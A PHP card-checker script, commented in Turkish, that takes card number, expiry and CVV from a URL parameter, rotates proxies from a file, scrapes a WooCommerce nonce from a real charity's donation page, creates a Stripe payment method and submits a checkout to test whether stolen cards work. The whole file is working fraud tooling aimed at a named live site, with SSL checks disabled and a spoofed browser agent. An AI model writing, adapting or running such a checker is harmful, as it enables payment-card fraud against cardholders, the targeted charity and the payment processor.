<?php
// Hataları gizle (JSON çıktısını bozmamak için)
error_reporting(0);
header('Content-Type: application/json');

// 1. GİRDİ KONTROLÜ
$cc = $_GET['cc'] ?? '';
if (empty($cc)) {
    echo json_encode(["status" => "error", "message" => "Kart bilgisi gönderilmedi."]);
    exit;
}

// 2. UA DOSYASINI DAHİL ET (Orijinal dosyanız)
if (file_exists('ua.php')) {
    include 'ua.php';
}

// 3. PROXY SEÇİMİ (proxy.txt dosyasından rastgele çeker)
$proxy_auth = null;
$proxy_url = null;

if (file_exists('proxy.txt')) {
    $proxies = file("proxy.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!empty($proxies)) {
        $randomProxy = $proxies[array_rand($proxies)];
        $p = explode(':', $randomProxy);
        
        if (count($p) == 4) {
            // ip:port:user:pass formatı
            $proxy_url = $p[0].':'.$p[1];
            $proxy_auth = $p[2].':'.$p[3];
        } else {
            // ip:port formatı
            $proxy_url = $randomProxy;
        }
    }
}

// 4. KART PARÇALAMA (4359720216544900|10|2028|846)
$parts = explode('|', $cc);
$n = $parts[0]; $m = $parts[1]; $y = $parts[2]; $c = $parts[3];

// 5. CURL FONKSİYONU (Render uyumlu çerez yolu eklenmiş)
function request($url, $post = null, $proxy = null, $auth = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    // Render'da sadece /tmp/ klasörüne yazma izni vardır
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');

    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        if ($auth) curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
    }

    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    
    return curl_exec($ch);
}

// --- BURADAN SONRASI SİZİN SİTEYE ÖZEL CHECKER ADIMLARINIZ ---

// Örnek Akış (Kendi st.php'nizdeki curl isteklerini buraya göre güncelleyin):
// 1. Adım: Nonce Çekme
$page = request("https://forcesforchange.org/donate/", null, $proxy_url, $proxy_auth);
preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $page, $nonce);

// 2. Adım: Stripe Token (Kendi PK anahtarınızı kullanın)
$stripe_post = "type=card&card[number]=$n&card[cvc]=$c&card[exp_month]=$m&card[exp_year]=$y&key=pk_live_xxxx...";
$stripe_res = request("https://api.stripe.com/v1/payment_methods", $stripe_post, $proxy_url, $proxy_auth);
$json_stripe = json_decode($stripe_res, true);
$pm_id = $json_stripe['id'];

// 3. Adım: Ödeme Tamamlama
if ($pm_id) {
    $checkout_post = "billing_first_name=James&payment_method=stripe&wc-stripe-payment-method=$pm_id&woocommerce-process-checkout-nonce=".$nonce[1];
    $final_res = request("https://forcesforchange.org/?wc-ajax=checkout", $checkout_post, $proxy_url, $proxy_auth);
    
    // Yanıtı basitleştirerek döndür
    echo $final_res;
} else {
    echo $stripe_res; // Stripe hatası dönerse onu göster
}
?>

